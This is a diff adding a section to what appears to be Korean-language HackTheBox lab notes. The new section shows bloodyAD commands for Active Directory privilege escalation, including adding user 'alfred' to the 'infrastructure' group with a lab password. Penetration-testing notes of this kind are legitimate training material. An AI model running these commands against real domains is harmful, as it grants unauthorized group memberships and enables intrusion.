@@ -855,3 +855,14 @@ bloodyAD -u ant.edwards -p 'Antman2025!' --host 10.129.232.75 -d puppy.htb remov
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>bloodyAD</strong></summary>
+
+- 레거시에서는 `net rpc`가 작동하나 최신 AD 환경에서는 작동하지 않아 `bloodyAD`를 사용.
+```bash
+bloodyAD -d tombwatcher.htb -u alfred -p basketball --host dc01.tombwatcher.htb add groupMember infrastructure alfred
+```
+  
+</details>
